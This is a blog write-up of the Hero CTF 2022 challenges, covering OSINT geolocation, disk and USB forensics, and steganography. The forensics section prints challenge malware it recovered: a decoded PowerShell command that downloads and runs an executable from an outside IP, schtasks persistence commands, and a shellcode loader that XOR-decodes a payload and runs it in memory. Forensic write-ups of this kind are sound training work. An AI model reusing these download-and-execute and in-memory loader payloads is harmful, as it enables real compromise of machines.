@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Hero CTF 2022 | Luhko</title>
+<meta name="keywords" content="">
+<meta name="description" content="OSINT HeroGuessr#1 We were given this panorama and we need to find the park next to it:
+Typing the name “Plage de Portissol” on Google Maps, we can see that there is only one park next the plage de Portissol : Victorin Blanc, which is the flag.
+HeroGuessr#2 We were given this panorama and we need to find the name of the city:
+Since Google Lens is pretty good to recognize monument, I tried it on the church.">
+<meta name="author" content="">
+<link rel="canonical" href="https://luhko.github.io/write-up/heroctf2022/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.41f2d211c00e636a3c229c52ef2d4299a66891ae66771098993b13bca7972ae6.css" integrity="sha256-QfLSEcAOY2o8IpxS7y1CmaZoka5mdxCYmTsTvKeXKuY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://luhko.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://luhko.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://luhko.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://luhko.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://luhko.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Hero CTF 2022" />
+<meta property="og:description" content="OSINT HeroGuessr#1 We were given this panorama and we need to find the park next to it:
+Typing the name “Plage de Portissol” on Google Maps, we can see that there is only one park next the plage de Portissol : Victorin Blanc, which is the flag.
+HeroGuessr#2 We were given this panorama and we need to find the name of the city:
+Since Google Lens is pretty good to recognize monument, I tried it on the church." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://luhko.github.io/write-up/heroctf2022/" /><meta property="article:section" content="write-up" />
+<meta property="article:published_time" content="2022-05-29T23:44:49&#43;02:00" />
+<meta property="article:modified_time" content="2022-05-29T23:44:49&#43;02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hero CTF 2022"/>
+<meta name="twitter:description" content="OSINT HeroGuessr#1 We were given this panorama and we need to find the park next to it:
+Typing the name “Plage de Portissol” on Google Maps, we can see that there is only one park next the plage de Portissol : Victorin Blanc, which is the flag.
+HeroGuessr#2 We were given this panorama and we need to find the name of the city:
+Since Google Lens is pretty good to recognize monument, I tried it on the church."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Hero CTF 2022",
+      "item": "https://luhko.github.io/write-up/heroctf2022/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Hero CTF 2022",
+  "name": "Hero CTF 2022",
+  "description": "OSINT HeroGuessr#1 We were given this panorama and we need to find the park next to it:\nTyping the name “Plage de Portissol” on Google Maps, we can see that there is only one park next the plage de Portissol : Victorin Blanc, which is the flag.\nHeroGuessr#2 We were given this panorama and we need to find the name of the city:\nSince Google Lens is pretty good to recognize monument, I tried it on the church.",
+  "keywords": [
+    
+  ],
+  "articleBody": "OSINT HeroGuessr#1 We were given this panorama and we need to find the park next to it:\nTyping the name “Plage de Portissol” on Google Maps, we can see that there is only one park next the plage de Portissol : Victorin Blanc, which is the flag.\nHeroGuessr#2 We were given this panorama and we need to find the name of the city:\nSince Google Lens is pretty good to recognize monument, I tried it on the church. And it does recognize it, which give us the name of the city!\nStickerz#1 We were given this image:\nWe can extract some interesting elements :\n It looks like an Ibis Hostel It seems like it is located in Paris It is near a park  Looking for a park next to an Ibis Hotel in Paris, there is not much choice:\nIf we look at it in street view, it looks exactly like our location. The theater next to the hostel is “Le monfort” which is the flag!\nForensics Where all the problem start 1 We have a usb.dump file:\n$ file usb.dump usb.dump: DOS/MBR boot sector, code offset 0x58+2, OEM-ID \"mkfs.fat\", sectors/cluster 8, Media descriptor 0xf8, sectors/track 62, heads 124, hidden sectors 32, sectors 7831282 (volumes  32 MB), FAT (32 bit), sectors/FAT 7640, reserved 0x1, serial number 0x9c286c52, unlabeled Let’s open it with autopsy. We can see the file Important_document.lnk which is suspicious regarding the name and the content:\nWe can decode the payload with this tool :\nYwBkACAAQwA6AFwAVQBzAGUAcgBzAFwAVwBvAHIAdAB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXAAgADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvADEANAA2AC4ANQA5AC4AMQA1ADYALgA4ADIALwBpAG0AZwAuAHAAbgBnACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlACIAIAA7ACAALgBcAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlAA== cd C:\\Users\\Worty\\AppData\\Local\\Temp\\ ; Invoke-WebRequest -Uri \"http://146.59.156.82/img.png\" -OutFile \"iexplorer64.exe\" ; .\\iexplorer64.exe The flag is Hero{http://146.59.156.82/img.png}\nWhere all the problem start 2 We were given a disk. I used autopsy again (3 hours of processing 💀). The first thing that I did was to check the PSReadLine history in the user directory :\nwsl --install shutdown -r -t 0 powershell -ep bypass \\\\\\\\wsl$\\\\Ubuntu\\\\tmp\\\\bc.ps1 schtask /list schtasks /list schtasks /? schtasks /Query ss schtasks /create /sc ONCE /tn apocalypse /tr 'echo \\'4xZkKhuR78J21Hwfsp3tmEDcS\\' ; \\\\\\\\wsl$\\\\Ubuntu\\\\tmp\\\\bc.ps1' /sd 22/05/2022 schtasks /create /sc ONCE /tn apocalypse /tr '\\\\\\\\wsl$\\\\Ubuntu\\\\tmp\\\\bc.ps1 -c 4xZkKhuR78J21Hwfsp3tmEDcS' /sd 22/05/2022 schtasks /create /sc ONCE /tn apocalypse /tr '\\\\\\\\wsl$\\\\Ubuntu\\\\tmp\\\\bc.ps1 -c 4xZkKhuR78J21Hwfsp3tmEDcS' /sd 22/05/2022 /st now schtasks /create /sc ONCE /tn apocalypse /tr '\\\\\\\\wsl$\\\\Ubuntu\\\\tmp\\\\bc.ps1 -c 4xZkKhuR78J21Hwfsp3tmEDcS' /sd 22/05/2022 /st 00:00 schtasks /Query schtasks /create /sc ONCE /tn apocalypse /tr '\\\\\\\\wsl$\\\\Ubuntu\\\\tmp\\\\bc.ps1 -c 4xZkKhuR78J21Hwfsp3tmEDcS' /sd 22/05/2022 /st 00:00 We can see that scheduled task were created in the registry. We can confirm this by checking in NTUSER.DAT (for the user j.bertrand)\nIn the event logs (Windows Powershell and Windows Powershell Operational), we can find the execution order and the content of the script bc.ps1 :\n$powershell.exe -Nop -sta -noni -w hidden -encodedCommand YwBkACAAQwA6AFwAVQBzAGUAcgBzAFwAagBlAGoAZQAwAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXAAgADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvADEANAA2AC4ANQA5AC4AMQA1ADYALgA4ADIALwBpAG0AZwAuAHAAbgBnACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlACIAIAA7ACAALgBcAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlAA== $powershell.exe/c schtasks /create /sc ONCE /tn apocalypse /tr 'echo '4xZkKhuR78J21Hwfsp3tmEDcS' ; \\\\wsl$\\Ubuntu\\tmp\\bc.ps1' /sd 22/05/2022 4xZkKhuR78J21Hwfsp3tmEDcS is a part of the flag. I gave it to cyberchef and it is base58 encoded.\nIf we look at the script bc.ps1, we can see a comment “YnlfZDNmM25kM3J9”, which is the last part of the flag, base64 encoded.\n#YnlfZDNmM25kM3J9 $DoIt = @' function func_get_proc_address { Param ($var_module, $var_procedure) $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string')) return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure)) } function func_get_delegate_type { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters, [Parameter(Position = 1)] [Type] $var_return_type = [Void] ) $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed') $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed') return $var_type_builder.CreateType() } [Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktzIyMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMdUV5ZSN0V3hxi8ltrUAG32dOMVCTD65juMUTvKT208wieaO5qo5ywyeEf9pwZKGG8TAcxE7iB58Wau94HkEUH2A9EqHVsSchnYO2f9slI3ZQRlEOYkRGTVcZA25MWUpPT0IMFw0TAwtATE5TQldKQU9GGANucGpmAxsNExgDdEpNR0xUUANtdwMWDRIYA3dRSkdGTVcMFw0TCi4pIyP2FEKmfj3qdxD71BUHQ2y4CfT0cWDSgxQPUZ3RM14/UbAwHFOh9b3h5CVXjb/xU61Jjip1sye0ULWrlbmx1pq3bondZkMv7MbGE4X7WhcJr5bCoLyAQEfseswZDDe1lGF6MG3aPm8078xGyYHQcuBDQE99MjljeYekDUYfxH08B33TsydminGhyInO1fy2Qq2TT0XpP/1xpL5Yd+vz6lsNEWUPo9XA8tKY2FTZxdkNBNujGR2SPBehUopPNfBB+PMVWOx2BPlaLiwEIexmHgR/VbFcxWnLrxLZUqtYuhh1LyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhUSDRoUDRIVEA0RFxQjOkqDrg==') for ($x = 0; $x -lt $var_code.Count; $x++) { $var_code[$x] = $var_code[$x] -bxor 35 } $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))) $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40) [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length) $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void]))) $var_runme.Invoke([IntPtr]::Zero) '@ If ([IntPtr]::size -eq 8) { start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job } else { IEX $DoIt } Now we need the first part which must be before the execution of the powershell script. If we strings iexplorer64.exe:\n... C:\\Users\\j.bertrand\\AppData\\Local\\Temp\\iexplorer64.exe 41AMoD4RLwE7h2REtSWSGfUFu ... 41AMoD4RLwE7h2REtSWSGfUFu is the first part of the flag, base 64 encoded. Full flag :\nHero{p3rs0n4l_3v1l_m4lw4r3_n0t_fl4g_by_d3f3nd3r}\nSteganography Ange The challenge name refers to a steganography technique called Angecryption, which consist to encrypt/decrypt a file to access another one. With the key and the IV given in the challenge decryption, we can try to decrypt the image:\n$ openssl enc -d -aes-128-cbc -in image.png -out output.png -K 7468697369736a757374 616b65797979 -iv 6f07333c9c2352e2e3b123b2fe26a25c But it fails. Let’s ty to encrypt it:\n$openssl enc -aes-128-cbc -in image.png -out output.png -K 7468697369736a757374 616b65797979 -iv 6f07333c9c2352e2e3b123b2fe26a25c It gives us a new PNG image:\nAfter submiting it to Aperisolve, we got the flag :\nLSD LSD reminds me of the LSB technics. I submitted it to Aperisolve, and there is something which looks like LSB:\nThe LSB is stored in a diagonal, starting from 0,0 to 317,317. With this simple script, it gives us a binary output :\nfrom PIL import Image import sys im = Image.open(\"secret.png\", 'r') pixels = im.load() width, height = im.size binary = '' for x in range(0,318,1): red = pixels[x, x][0] green = pixels[x, x][1] blue = pixels[x, x][2] a = pixels[x, x][3] binary += bin(red)[-1] + bin(green)[-1]+ bin(blue)[-1] + bin(a)[-1] print(binary) Once decoded from binary to ASCII, we got the flag :\nWell done champ, you're starting to touch some real steganography. Glad you didn't just throw a random script. Here is your flag: Hero{L5B_D14G_0R1G1N4L_N0P_?} ",
+  "wordCount" : "910",
+  "inLanguage": "en",
+  "datePublished": "2022-05-29T23:44:49+02:00",
+  "dateModified": "2022-05-29T23:44:49+02:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://luhko.github.io/write-up/heroctf2022/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Luhko",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://luhko.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://luhko.github.io/" accesskey="h" title="Luhko (Alt + H)">Luhko</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://luhko.github.io/articles" title="Articles">
+                    <span>Articles</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://luhko.github.io/write-up" title="Write-Up">
+                    <span>Write-Up</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://luhko.github.io/">Home</a></div>
+    <h1 class="post-title">
+      Hero CTF 2022
+    </h1>
+    <div class="post-meta"><span title='2022-05-29 23:44:49 +0200 CEST'>May 29, 2022</span>&nbsp;·&nbsp;5 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#osint" aria-label="OSINT">OSINT</a><ul>
+                        
+                <li>
+                    <a href="#heroguessr1" aria-label="HeroGuessr#1">HeroGuessr#1</a></li>
+                <li>
+                    <a href="#heroguessr2" aria-label="HeroGuessr#2">HeroGuessr#2</a></li></ul>
+                </li>
+                <li>
+                    <a href="#stickerz1" aria-label="Stickerz#1">Stickerz#1</a></li>
+                <li>
+                    <a href="#forensics" aria-label="Forensics">Forensics</a><ul>
+                        
+                <li>
+                    <a href="#where-all-the-problem-start-1" aria-label="Where all the problem start 1">Where all the problem start 1</a></li>
+                <li>
+                    <a href="#where-all-the-problem-start-2" aria-label="Where all the problem start 2">Where all the problem start 2</a></li></ul>
+                </li>
+                <li>
+                    <a href="#steganography" aria-label="Steganography">Steganography</a><ul>
+                        
+                <li>
+                    <a href="#ange" aria-label="Ange">Ange</a></li>
+                <li>
+                    <a href="#lsd" aria-label="LSD">LSD</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="osint">OSINT<a hidden class="anchor" aria-hidden="true" href="#osint">#</a></h1>
+<h2 id="heroguessr1">HeroGuessr#1<a hidden class="anchor" aria-hidden="true" href="#heroguessr1">#</a></h2>
+<p>We were given this panorama and we need to find the park next to it:</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled.png" alt="Untitled"  />
+</p>
+<p>Typing the name “Plage de Portissol” on Google Maps, we can see that there is only one park next the plage de Portissol : Victorin Blanc, which is the flag.</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%201.png" alt="Untitled"  />
+</p>
+<h2 id="heroguessr2">HeroGuessr#2<a hidden class="anchor" aria-hidden="true" href="#heroguessr2">#</a></h2>
+<p>We were given this panorama and we need to find the name of the city:</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%202.png" alt="Untitled"  />
+</p>
+<p>Since Google Lens is pretty good to recognize monument, I tried it on the church. And it does recognize it, which give us the name of the city!</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%203.png" alt="Untitled"  />
+</p>
+<h1 id="stickerz1">Stickerz#1<a hidden class="anchor" aria-hidden="true" href="#stickerz1">#</a></h1>
+<p>We were given this image:</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled.jpeg" alt="Untitled"  />
+</p>
+<p>We can extract some interesting elements :</p>
+<ul>
+<li>It looks like an Ibis Hostel</li>
+<li>It seems like it is located in Paris</li>
+<li>It is near a park</li>
+</ul>
+<p>Looking for a park next to an Ibis Hotel in Paris, there is not much choice:</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%204.png" alt="Untitled"  />
+</p>
+<p>If we look at it in street view, it looks exactly like our location. The theater next to the hostel is “Le monfort” which is the flag!</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%205.png" alt="Untitled"  />
+</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%206.png" alt="Untitled"  />
+</p>
+<h1 id="forensics">Forensics<a hidden class="anchor" aria-hidden="true" href="#forensics">#</a></h1>
+<h2 id="where-all-the-problem-start-1">Where all the problem start 1<a hidden class="anchor" aria-hidden="true" href="#where-all-the-problem-start-1">#</a></h2>
+<p>We have a <code>usb.dump</code> file:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ file usb.dump
+usb.dump: DOS/MBR boot sector, code offset 0x58+2, OEM-ID <span class="s2">&#34;mkfs.fat&#34;</span>, sectors/cluster 8, Media descriptor 0xf8, sectors/track 62, heads 124, hidden sectors 32, sectors <span class="m">7831282</span> <span class="o">(</span>volumes &gt; <span class="m">32</span> MB<span class="o">)</span>, FAT <span class="o">(</span><span class="m">32</span> bit<span class="o">)</span>, sectors/FAT 7640, reserved 0x1, serial number 0x9c286c52, unlabeled
+</code></pre></div><p>Let’s open it with autopsy. We can see the file <code>Important_document.lnk</code> which is suspicious regarding the name and the content:</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%207.png" alt="Untitled"  />
+</p>
+<p>We can decode the payload with this <a href="https://raikia.com/tool-powershell-encoder/">tool</a> :</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">YwBkACAAQwA6AFwAVQBzAGUAcgBzAFwAVwBvAHIAdAB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXAAgADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvADEANAA2AC4ANQA5AC4AMQA1ADYALgA4ADIALwBpAG0AZwAuAHAAbgBnACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlACIAIAA7ACAALgBcAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlAA</span><span class="o">==</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">cd </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Worty</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span> <span class="p">;</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://146.59.156.82/img.png&#34;</span> <span class="n">-OutFile</span> <span class="s2">&#34;iexplorer64.exe&#34;</span> <span class="p">;</span> <span class="p">.\</span><span class="n">iexplorer64</span><span class="p">.</span><span class="n">exe</span>
+</code></pre></div><p>The flag is <code>Hero{http://146.59.156.82/img.png}</code></p>
+<h2 id="where-all-the-problem-start-2">Where all the problem start 2<a hidden class="anchor" aria-hidden="true" href="#where-all-the-problem-start-2">#</a></h2>
+<p>We were given a disk. I used autopsy again (3 hours of processing 💀). The first thing that I did was to check the <code>PSReadLine</code> history in the user directory :</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">wsl --install
+shutdown -r -t <span class="m">0</span>
+powershell -ep bypass <span class="se">\\\\</span>wsl$<span class="se">\\</span>Ubuntu<span class="se">\\</span>tmp<span class="se">\\</span>bc.ps1
+schtask /list
+schtasks /list
+schtasks /?
+schtasks /Query
+ss
+schtasks /create /sc ONCE /tn apocalypse /tr <span class="s1">&#39;echo \&#39;</span>4xZkKhuR78J21Hwfsp3tmEDcS<span class="se">\&#39;</span> <span class="p">;</span> <span class="se">\\\\</span>wsl$<span class="se">\\</span>Ubuntu<span class="se">\\</span>tmp<span class="se">\\</span>bc.ps1<span class="s1">&#39; /sd 22/05/2022
+</span><span class="s1">schtasks /create /sc ONCE /tn apocalypse /tr &#39;</span><span class="se">\\\\</span>wsl$<span class="se">\\</span>Ubuntu<span class="se">\\</span>tmp<span class="se">\\</span>bc.ps1 -c 4xZkKhuR78J21Hwfsp3tmEDcS<span class="s1">&#39; /sd 22/05/2022
+</span><span class="s1">schtasks /create /sc ONCE /tn apocalypse /tr &#39;</span><span class="se">\\\\</span>wsl$<span class="se">\\</span>Ubuntu<span class="se">\\</span>tmp<span class="se">\\</span>bc.ps1 -c 4xZkKhuR78J21Hwfsp3tmEDcS<span class="s1">&#39; /sd 22/05/2022 /st now
+</span><span class="s1">schtasks /create /sc ONCE /tn apocalypse /tr &#39;</span><span class="se">\\\\</span>wsl$<span class="se">\\</span>Ubuntu<span class="se">\\</span>tmp<span class="se">\\</span>bc.ps1 -c 4xZkKhuR78J21Hwfsp3tmEDcS<span class="s1">&#39; /sd 22/05/2022 /st 00:00
+</span><span class="s1">schtasks /Query
+</span><span class="s1">schtasks /create /sc ONCE /tn apocalypse /tr &#39;</span><span class="se">\\\\</span>wsl$<span class="se">\\</span>Ubuntu<span class="se">\\</span>tmp<span class="se">\\</span>bc.ps1 -c 4xZkKhuR78J21Hwfsp3tmEDcS<span class="err">&#39;</span> /sd 22/05/2022 /st 00:00
+</code></pre></div><p>We can see that scheduled task were created in the registry. We can confirm this by checking in <code>NTUSER.DAT</code> (for the user <code>j.bertrand</code>)</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%208.png" alt="Untitled"  />
+</p>
+<p>In the event logs (<code>Windows Powershell</code> and <code>Windows Powershell Operational</code>), we can find the execution order and the content of the script <code>bc.ps1</code> :</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Nop</span> <span class="n">-sta</span> <span class="n">-noni</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-encodedCommand</span> <span class="n">YwBkACAAQwA6AFwAVQBzAGUAcgBzAFwAagBlAGoAZQAwAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXAAgADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvADEANAA2AC4ANQA5AC4AMQA1ADYALgA4ADIALwBpAG0AZwAuAHAAbgBnACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlACIAIAA7ACAALgBcAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlAA</span><span class="p">==</span>
+<span class="nv">$powershell</span><span class="p">.</span><span class="n">exe</span><span class="p">/</span><span class="n">c</span> <span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="nb">sc </span><span class="n">ONCE</span> <span class="p">/</span><span class="n">tn</span> <span class="n">apocalypse</span> <span class="p">/</span><span class="n">tr</span> <span class="s1">&#39;echo &#39;</span><span class="n">4xZkKhuR78J21Hwfsp3tmEDcS</span><span class="s1">&#39; ; \\wsl$\Ubuntu\tmp\bc.ps1&#39;</span> <span class="p">/</span><span class="n">sd</span> <span class="n">22</span><span class="p">/</span><span class="n">05</span><span class="p">/</span><span class="n">2022</span>
+</code></pre></div><p><strong>4xZkKhuR78J21Hwfsp3tmEDcS</strong> is a part of the flag. I gave it to cyberchef and it is base58 encoded.</p>
+<p>If we look at the script <code>bc.ps1</code>, we can see a comment “<strong>YnlfZDNmM25kM3J9”</strong>, which is the last part of the flag, base64 encoded.</p>
+<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="err">#</span><span class="n">YnlfZDNmM25kM3J9</span>
+
+<span class="err">$</span><span class="n">DoIt</span> <span class="p">=</span> <span class="err">@&#39;</span>
+<span class="n">function</span> <span class="n">func_get_proc_address</span> <span class="p">{</span>
+        <span class="n">Param</span> <span class="p">(</span><span class="err">$</span><span class="n">var_module</span><span class="p">,</span> <span class="err">$</span><span class="n">var_procedure</span><span class="p">)</span>
